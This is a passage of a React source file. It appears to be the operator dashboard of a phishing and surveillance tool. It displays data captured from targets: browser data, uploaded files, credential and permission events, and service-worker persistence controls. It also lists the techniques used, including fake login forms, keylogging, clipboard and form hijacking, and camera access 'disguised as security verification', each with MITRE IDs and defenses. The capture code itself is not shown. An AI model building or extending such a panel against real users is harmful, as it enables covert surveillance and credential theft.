                                <span className="font-mono truncate max-w-[55%] text-[10px]">{String(v)}</span>
                              </div>
                            ))}
                          </div>
                          <div className="grid grid-cols-2 gap-2">
                            <div className="bg-muted/30 p-2 rounded"><span className="text-muted-foreground">History Length</span><p className="font-mono">{liveBrowserData.historyLength}</p></div>
                            <div className="bg-muted/30 p-2 rounded"><span className="text-muted-foreground">Plugins</span><p className="font-mono">{liveBrowserData.plugins?.length || 0}</p></div>
                          </div>
                          {liveBrowserData.plugins?.length > 0 && (
                            <div><p className="font-medium text-muted-foreground mb-1">Plugins</p>{liveBrowserData.plugins.map((p: string, i: number) => <p key={i} className="text-[10px] font-mono">{p}</p>)}</div>
                          )}
                        </div>
                      ) : <p className="text-xs text-muted-foreground text-center py-6">No browser data yet.</p>}
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>

              <TabsContent value="education" className="space-y-4 mt-4">
                {(() => {
                  const eduItems = [
                    { category: "Canvas Fingerprint", captured: !!liveAutoHarvest?.canvasFingerprint, mitre: "T1592.004", risk: "High", prevalence: "Used by 73% of tracking scripts", defense: "Use Firefox with resistFingerprinting enabled, or Tor Browser", description: "Creates a hidden canvas element and draws shapes/text to produce a unique hash based on GPU/driver rendering differences." },
                    { category: "WebGL Fingerprint", captured: !!liveAutoHarvest?.webglFingerprint, mitre: "T1592.004", risk: "High", prevalence: "Present in 68% of fingerprinting libraries", defense: "Disable WebGL or use browser extensions like WebGL Fingerprint Defender", description: "Extracts GPU vendor, renderer, and capabilities to build a hardware profile unique to the device." },
                    { category: "Audio Fingerprint", captured: !!liveAutoHarvest?.audioFingerprint, mitre: "T1592.004", risk: "Medium", prevalence: "Used by 41% of advanced trackers", defense: "Use browsers with audio context randomization (Brave, Tor)", description: "Processes audio through an oscillator and compressor to detect unique signal processing characteristics." },
                    { category: "WebRTC IP Leak", captured: (liveAutoHarvest?.webrtcLeakedIPs?.length || 0) > 0, mitre: "T1590.005", risk: "Critical", prevalence: "Bypasses VPNs in 85% of cases", defense: "Disable WebRTC in browser settings or use uBlock Origin's WebRTC leak prevention", description: "STUN requests reveal local and public IP addresses even when behind a VPN or proxy." },
                    { category: "Font Enumeration", captured: (liveAutoHarvest?.fontCount || 0) > 0, mitre: "T1592.004", risk: "Medium", prevalence: "Used by 62% of trackers", defense: "Limit installed fonts or use font randomization extensions", description: "Measures text rendering widths to detect which fonts are installed, creating a unique system profile." },
                    { category: "Credential Harvesting", captured: liveCredentials.length > 0, mitre: "T1056.003", risk: "Critical", prevalence: "#1 attack vector in phishing", defense: "Use password managers with auto-fill, enable 2FA, verify URL before entering credentials", description: "Fake login forms that mimic legitimate services to capture usernames, passwords, and payment details." },
                    { category: "Keystroke Logging", captured: liveKeylogs.length > 0, mitre: "T1056.001", risk: "Critical", prevalence: "Present in 90%+ of RATs", defense: "Use virtual keyboards for sensitive input, use password managers", description: "Records every keypress in real-time, capturing passwords, messages, and sensitive data as it's typed." },
                    { category: "Camera/Mic Access", captured: permissionStatuses.camera.status === "granted" || permissionStatuses.microphone.status === "granted", mitre: "T1125/T1123", risk: "Critical", prevalence: "Social engineering success rate: 34%", defense: "Use physical camera covers, revoke browser permissions regularly, watch for recording indicators", description: "Browser permission requests disguised as security verification to gain access to camera and microphone." },
                    { category: "Geolocation", captured: !!liveLocation, mitre: "T1614.001", risk: "High", prevalence: "Used in 45% of targeted attacks", defense: "Deny location requests, use VPN, disable GPS on mobile", description: "High-accuracy GPS coordinates obtained through browser geolocation API under false pretenses." },
                    { category: "Browser Data Exfil", captured: !!liveBrowserData, mitre: "T1005", risk: "High", prevalence: "Common in browser extensions/malware", defense: "Clear cookies regularly, use private browsing, limit localStorage data", description: "Reads cookies, localStorage, sessionStorage, and browser plugins to extract session tokens and personal data." },
                    { category: "Clipboard Hijacking", captured: liveClipboard.length > 0, mitre: "T1115", risk: "High", prevalence: "Used to steal crypto addresses, passwords", defense: "Never copy sensitive data unnecessarily, use clipboard managers with history", description: "Reads clipboard contents which may contain passwords, crypto addresses, or sensitive copied text." },
                    { category: "Form Hijacking", captured: liveFormIntercepts.length > 0, mitre: "T1056.003", risk: "High", prevalence: "Common in Magecart-style attacks", defense: "Use password managers instead of typing, check for HTTPS", description: "MutationObserver-based injection that intercepts form field values in real-time as users type." },
                  ];
                  const capturedItems = eduItems.filter((e) => e.captured);
                  return (
                    <>
                      <Card>
                        <CardHeader className="pb-2">
                          <CardTitle className="text-sm flex items-center justify-between">
                            <span className="flex items-center gap-2"><AlertTriangle className="w-4 h-4 text-yellow-400" />What We Captured - Educational Breakdown</span>
                            <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => {
                              const exportData = { sessionId: activeSessionId, timestamp: new Date().toISOString(), capturedVectors: capturedItems.map(({ category, mitre, risk, description, defense }) => ({ category, mitre, risk, description, defense })), totalVectors: eduItems.length, capturedCount: capturedItems.length };
                              const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: "application/json" });
                              const l = document.createElement("a"); l.download = `education-report-${Date.now()}.json`; l.href = URL.createObjectURL(blob); l.click(); URL.revokeObjectURL(l.href);
                              toast({ title: "Report exported" });
                            }} data-testid="button-export-education"><Download className="w-3 h-3 mr-1" />Export Report</Button>
                          </CardTitle>
                        </CardHeader>
                        <CardContent>
                          <p className="text-xs text-muted-foreground mb-4">This breakdown shows every data collection technique used during this session, mapped to real-world attack frameworks with defense recommendations.</p>
                          <div className="space-y-3">
                            {eduItems.map((item) => (
                              <div key={item.category} className={`p-3 rounded-lg border ${item.captured ? "border-red-500/20 bg-red-500/5" : "border-border/30 bg-muted/10 opacity-50"}`} data-testid={`edu-item-${item.category.toLowerCase().replace(/\s+/g, "-")}`}>
                                <div className="flex items-center justify-between mb-1">
                                  <div className="flex items-center gap-2">
                                    {item.captured ? <CheckCircle2 className="w-3.5 h-3.5 text-red-400" /> : <XCircle className="w-3.5 h-3.5 text-muted-foreground/40" />}
                                    <span className="text-xs font-semibold">{item.category}</span>
                                  </div>
                                  <div className="flex items-center gap-2">
                                    <Badge variant="secondary" className="text-[9px] px-1.5 py-0 font-mono">{item.mitre}</Badge>
                                    <Badge className={`text-[9px] px-1.5 py-0 ${item.risk === "Critical" ? "bg-red-500/20 text-red-400" : item.risk === "High" ? "bg-orange-500/20 text-orange-400" : "bg-yellow-500/20 text-yellow-400"}`}>{item.risk}</Badge>
                                  </div>
                                </div>
                                <p className="text-[10px] text-muted-foreground mb-1.5">{item.description}</p>
                                <p className="text-[10px] text-muted-foreground/70 italic mb-1">{item.prevalence}</p>
                                <div className="flex items-start gap-1.5 mt-1 pt-1 border-t border-border/20">
                                  <Shield className="w-3 h-3 text-green-400 flex-shrink-0 mt-0.5" />
                                  <p className="text-[10px] text-green-400/80">{item.defense}</p>
                                </div>
                              </div>
                            ))}
                          </div>
                        </CardContent>
                      </Card>
                    </>
                  );
                })()}
              </TabsContent>

              <TabsContent value="files" className="space-y-4 mt-4">
                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><FileText className="w-4 h-4 text-orange-400" />Files Received ({liveFiles.length})</span>
                      {liveFiles.length > 0 && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={downloadAllFiles} data-testid="button-download-all-files"><Download className="w-3 h-3 mr-1" />Download All</Button>}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveFiles.length > 0 ? (
                      <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
                        {liveFiles.map((file, i) => (
                          <div key={i} className="flex items-center gap-2 p-2 rounded-lg bg-muted/30 border border-border/30" data-testid={`file-item-${i}`}>
                            {file.preview && file.type?.startsWith("image/") ? (
                              <img src={file.preview} alt={file.name} className="w-10 h-10 rounded object-cover" />
                            ) : (
                              <div className="w-10 h-10 rounded bg-muted flex items-center justify-center"><FileText className="w-5 h-5 text-muted-foreground" /></div>
                            )}
                            <div className="flex-1 min-w-0">
                              <p className="text-xs font-medium truncate">{file.name}</p>
                              <p className="text-[10px] text-muted-foreground">{file.type} - {(file.size / 1024).toFixed(1)} KB</p>
                            </div>
                            <Button size="sm" variant="ghost" className="h-6 w-6 p-0" onClick={() => downloadFile(file)} data-testid={`button-download-file-${i}`}><Download className="w-3 h-3" /></Button>
                          </div>
                        ))}
                      </div>
                    ) : <p className="text-xs text-muted-foreground text-center py-8">No files received yet. Request "Files" access from the Control tab.</p>}
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="events" className="space-y-4 mt-4">
                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2"><Activity className="w-4 h-4 text-cyan-400" />Session Events ({events.length})</span>
                      <div className="flex items-center gap-1">
                        <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={selectAllEvents} data-testid="button-select-all-events"><ListChecks className="w-3 h-3 mr-1" />All</Button>
                        <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={deselectAllEvents} data-testid="button-deselect-all-events">None</Button>
                      </div>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {selectedEventsCount > 0 && (
                      <div className="flex items-center gap-2 mb-3 p-2 rounded-lg bg-primary/5 border border-primary/20">
                        <span className="text-xs text-muted-foreground">{selectedEventsCount} selected</span>
                        <div className="flex items-center gap-1 ml-auto">
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={exportSelectedEvents} data-testid="button-export-events"><Download className="w-3 h-3 mr-1" />Export JSON</Button>
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={copySelectedEvents} data-testid="button-copy-events"><Copy className="w-3 h-3 mr-1" />Copy</Button>
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px] text-red-400" onClick={clearSelectedEvents} data-testid="button-clear-events"><Trash2 className="w-3 h-3 mr-1" />Clear</Button>
                        </div>
                      </div>
                    )}
                    {events.length > 0 ? (
                      <div className="space-y-1 max-h-96 overflow-y-auto">
                        {events.map((evt) => {
                          const colorMap: Record<string, string> = { credential: "text-red-400", permission: "text-yellow-400", connection: "text-green-400", control: "text-blue-400", data: "text-purple-400", action: "text-orange-400", request: "text-cyan-400", system: "text-muted-foreground" };
                          return (
                            <div key={evt.id} className={`flex items-start gap-2 p-2 rounded text-xs hover:bg-muted/30 cursor-pointer ${evt.selected ? "bg-primary/5 border border-primary/20" : ""}`} onClick={() => toggleEventSelect(evt.id)} data-testid={`event-item-${evt.id}`}>
                              <Checkbox checked={evt.selected} className="mt-0.5" />
                              <ChevronRight className={`w-3 h-3 mt-0.5 flex-shrink-0 ${colorMap[evt.type] || "text-muted-foreground"}`} />
                              <div className="flex-1 min-w-0">
                                <div className="flex items-center gap-2">
                                  <Badge variant="secondary" className="text-[9px] px-1 py-0">{evt.type}</Badge>
                                  <span className="text-[10px] text-muted-foreground">{new Date(evt.timestamp).toLocaleTimeString()}</span>
                                </div>
                                <p className="text-muted-foreground mt-0.5 break-all">{evt.details}</p>
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    ) : <p className="text-xs text-muted-foreground text-center py-8">No events yet. Actions will be logged here.</p>}
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="persistence" className="space-y-4 mt-4">
                <PersistenceTab />
              </TabsContent>
            </Tabs>
          )}
        </div>
      )}
    </div>
  );
}

function PersistenceTab() {
  const { toast } = useToast();
  const [swStatus, setSwStatus] = useState<{ installed: boolean; active: boolean; waiting: boolean; scope: string; state: string }>({ installed: false, active: false, waiting: false, scope: "", state: "not-installed" });
  const [pushStatus, setPushStatus] = useState<{ subscribed: boolean; endpoint?: string }>({ subscribed: false });
  const [cacheInfo, setCacheInfo] = useState<{ names: string[]; estimatedSize?: number }>({ names: [] });
  const [notifPermission, setNotifPermission] = useState<string>("default");
  const [loading, setLoading] = useState<string | null>(null);
  const [telemetry, setTelemetry] = useState<any[]>([]);

  const refreshStatus = useCallback(async () => {
    const [sw, push, cache] = await Promise.all([getSwStatus(), getPushSubscriptionStatus(), getCacheStatus()]);
    setSwStatus(sw);
    setPushStatus(push);
    setCacheInfo(cache);
    if ("Notification" in window) setNotifPermission(Notification.permission);
    try {
      const res = await fetch("/api/sw/telemetry?limit=20", { credentials: "include" });
      if (res.ok) setTelemetry(await res.json());
    } catch {}
  }, []);

  useEffect(() => { refreshStatus(); }, [refreshStatus]);

  useEffect(() => {
    const handler = () => refreshStatus();
    window.addEventListener("sw-status-change", handler);
    return () => window.removeEventListener("sw-status-change", handler);
  }, [refreshStatus]);

  const handleEnableNotifications = async () => {
    setLoading("notif");
    try {
      const perm = await requestNotificationPermission();
      setNotifPermission(perm);
      if (perm === "granted") {
        const sub = await subscribeToPush();
        if (sub) {
          setPushStatus({ subscribed: true, endpoint: sub.endpoint });
          toast({ title: "Push notifications enabled", description: "You will receive background alerts." });
        }
      } else {
        toast({ title: "Permission denied", description: "Notification permission was not granted.", variant: "destructive" });
      }
    } catch { toast({ title: "Failed", variant: "destructive" }); }
    setLoading(null);
    refreshStatus();
  };

  const handleDisableNotifications = async () => {
    setLoading("notif");
    await unsubscribeFromPush();
    setPushStatus({ subscribed: false });
    toast({ title: "Push notifications disabled" });
    setLoading(null);
    refreshStatus();
  };

  const handleSendTestPush = async () => {
    setLoading("push");
    try {
      await apiRequest("POST", "/api/push/send", { title: "AegisAI360 Alert", body: "Background persistence test notification" });
      toast({ title: "Test push sent" });
    } catch { toast({ title: "Failed to send", variant: "destructive" }); }
    setLoading(null);
    refreshStatus();
  };

  const handleTriggerSync = async () => {
    setLoading("sync");
    const ok = await triggerBackgroundSync("aegis-telemetry-sync");
    toast({ title: ok ? "Background sync triggered" : "Background sync not supported" });
    setLoading(null);
    refreshStatus();
  };

  const handleGetSwInfo = async () => {
    setLoading("info");
    const info = await sendSwMessage({ type: "GET_SW_STATUS" });
    if (info) toast({ title: "SW Info", description: `Caches: ${info.cacheNames?.join(", ") || "none"}, State: ${info.state}` });
    setLoading(null);
  };

  const formatBytes = (b?: number) => {
    if (!b) return "Unknown";
    if (b < 1024) return b + " B";
    if (b < 1024 * 1024) return (b / 1024).toFixed(1) + " KB";
    return (b / (1024 * 1024)).toFixed(1) + " MB";
  };

  const statusItems = [
    { label: "Service Worker", value: swStatus.installed ? "Installed" : "Not Installed", active: swStatus.installed, icon: HardDrive },
    { label: "SW State", value: swStatus.state, active: swStatus.state === "activated", icon: RefreshCw },
    { label: "Push Subscription", value: pushStatus.subscribed ? "Active" : "Inactive", active: pushStatus.subscribed, icon: BellRing },
    { label: "Notification Permission", value: notifPermission, active: notifPermission === "granted", icon: Bell },
    { label: "Cache Storage", value: `${cacheInfo.names.length} cache(s) - ${formatBytes(cacheInfo.estimatedSize)}`, active: cacheInfo.names.length > 0, icon: HardDrive },
  ];

  const eduPersistence = [
    { technique: "T1176", name: "Browser Extensions", desc: "Service Workers act as programmable network proxies that persist beyond page lifecycle, intercepting requests and enabling offline functionality.", defense: "Audit registered Service Workers in browser DevTools > Application > Service Workers." },
    { technique: "T1547.001", name: "Boot/Logon Autostart", desc: "PWA installation creates OS-level app entries that launch independently of the browser, providing persistent access through legitimate app frameworks.", defense: "Review installed PWAs in browser settings and remove unused applications." },
    { technique: "T1071.001", name: "Web Protocols (Push API)", desc: "Push notifications maintain a persistent channel from server to client even when the app is closed, using standard Web Push protocol over HTTPS.", defense: "Manage notification permissions per-site in browser settings. Revoke permissions for untrusted sites." },
    { technique: "T1029", name: "Scheduled Transfer (Background Sync)", desc: "Background Sync API defers data transfers until network connectivity is available, enabling reliable data exfiltration even with intermittent connections.", defense: "Monitor Background Sync registrations in DevTools. Restrict site permissions for background activity." },
    { technique: "T1074.001", name: "Local Data Staging (Cache API)", desc: "Cache Storage API allows pre-positioning of resources for offline access, potentially staging payloads or caching sensitive responses locally.", defense: "Periodically clear site data and cached storage. Use private/incognito browsing for sensitive operations." },
  ];

  return (
    <>
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-sm flex items-center justify-between">
            <span className="flex items-center gap-2"><Anchor className="w-4 h-4 text-amber-400" />Background Persistence Status</span>
            <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={refreshStatus} data-testid="button-refresh-persistence"><RefreshCw className="w-3 h-3 mr-1" />Refresh</Button>
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {statusItems.map((item) => (
              <div key={item.label} className="flex items-center gap-3 p-3 rounded-lg bg-muted/20 border border-border/50" data-testid={`status-${item.label.toLowerCase().replace(/\s/g, "-")}`}>
                <item.icon className={`w-4 h-4 ${item.active ? "text-green-400" : "text-muted-foreground"}`} />
                <div className="flex-1 min-w-0">
                  <p className="text-xs font-medium">{item.label}</p>
                  <p className="text-[10px] text-muted-foreground">{item.value}</p>
                </div>
                <div className={`w-2 h-2 rounded-full ${item.active ? "bg-green-500" : "bg-muted-foreground/30"}`} />
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-sm flex items-center gap-2"><Power className="w-4 h-4 text-blue-400" />Persistence Controls</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
            {!pushStatus.subscribed ? (
              <Button size="sm" variant="outline" className="h-9 text-xs" onClick={handleEnableNotifications} disabled={loading === "notif"} data-testid="button-enable-notifications">
                {loading === "notif" ? <Loader2 className="w-3 h-3 mr-1 animate-spin" /> : <Bell className="w-3 h-3 mr-1" />}Enable Push
              </Button>
            ) : (
              <Button size="sm" variant="outline" className="h-9 text-xs text-red-400" onClick={handleDisableNotifications} disabled={loading === "notif"} data-testid="button-disable-notifications">
                <BellRing className="w-3 h-3 mr-1" />Disable Push
              </Button>
            )}
            <Button size="sm" variant="outline" className="h-9 text-xs" onClick={handleSendTestPush} disabled={loading === "push" || !pushStatus.subscribed} data-testid="button-send-test-push">
              {loading === "push" ? <Loader2 className="w-3 h-3 mr-1 animate-spin" /> : <BellRing className="w-3 h-3 mr-1" />}Test Push
            </Button>
            <Button size="sm" variant="outline" className="h-9 text-xs" onClick={handleTriggerSync} disabled={loading === "sync"} data-testid="button-trigger-sync">
              {loading === "sync" ? <Loader2 className="w-3 h-3 mr-1 animate-spin" /> : <RefreshCw className="w-3 h-3 mr-1" />}Bg Sync
            </Button>
            <Button size="sm" variant="outline" className="h-9 text-xs" onClick={handleGetSwInfo} disabled={loading === "info"} data-testid="button-sw-info">
              {loading === "info" ? <Loader2 className="w-3 h-3 mr-1 animate-spin" /> : <HardDrive className="w-3 h-3 mr-1" />}SW Info
            </Button>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-sm flex items-center gap-2"><Activity className="w-4 h-4 text-cyan-400" />Background Telemetry Log</CardTitle>
        </CardHeader>
        <CardContent>
          {telemetry.length > 0 ? (
            <div className="space-y-1 max-h-60 overflow-y-auto">
              {telemetry.map((entry: any) => (
                <div key={entry.id} className="flex items-center gap-2 p-2 rounded text-xs bg-muted/10 hover:bg-muted/20" data-testid={`telemetry-${entry.id}`}>
                  <Badge variant="secondary" className="text-[9px] px-1 py-0 shrink-0">{entry.eventType}</Badge>
                  <span className="text-[10px] text-muted-foreground">{new Date(entry.createdAt).toLocaleString()}</span>
                  <span className="text-[10px] text-muted-foreground truncate ml-auto">{JSON.stringify(entry.eventData).slice(0, 80)}</span>
                </div>
              ))}
            </div>
          ) : (
            <p className="text-xs text-muted-foreground text-center py-6">No background telemetry events recorded yet. Enable push notifications or trigger background sync to generate events.</p>
          )}
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-sm flex items-center gap-2"><AlertTriangle className="w-4 h-4 text-orange-400" />Persistence Techniques - MITRE ATT&CK Mapping</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-3">
            {eduPersistence.map((item) => (
              <div key={item.technique} className="p-3 rounded-lg border border-border/50 bg-muted/10" data-testid={`edu-persistence-${item.technique}`}>
                <div className="flex items-center gap-2 mb-1">
                  <Badge variant="outline" className="text-[9px] px-1.5 py-0 font-mono text-amber-400 border-amber-400/30">{item.technique}</Badge>
                  <span className="text-xs font-medium">{item.name}</span>
                </div>
                <p className="text-[11px] text-muted-foreground">{item.desc}</p>
                <div className="mt-2 p-2 rounded bg-green-500/5 border border-green-500/20">
                  <p className="text-[10px] text-green-400"><Shield className="w-3 h-3 inline mr-1" />Defense: {item.defense}</p>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </>
  );
}
